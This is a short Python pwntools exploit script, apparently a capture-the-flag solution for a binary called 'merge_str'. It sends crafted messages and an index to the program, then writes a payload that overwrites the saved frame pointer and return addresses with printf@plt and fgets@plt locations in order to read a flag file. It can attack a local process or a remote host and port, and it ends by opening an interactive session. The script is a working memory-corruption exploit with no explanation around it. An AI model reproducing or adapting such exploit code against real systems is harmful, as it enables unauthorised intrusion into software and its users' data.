#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.sendlineafter('Message 1 : ', flat(['r\x00', "x" * 11]))

	r.sendlineafter('Message 2 : ', 'AAAA/home/mergemessage/flag') 
	r.sendlineafter('?(Y/N)', 'y')

	r.sendlineafter('Index :', '190')

	payload = flat({
					18: 0x804c120,		# saved ebp
					22: 0x80488F1,		#   printf@plt
					26: 0x804b084,		# : fgets@plt
					30: 0x804b180})		#	   
	r.sendlineafter('String:', payload)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./merge_str'])
        print util.proc.pidof(r)
        pause()
        exploit(r)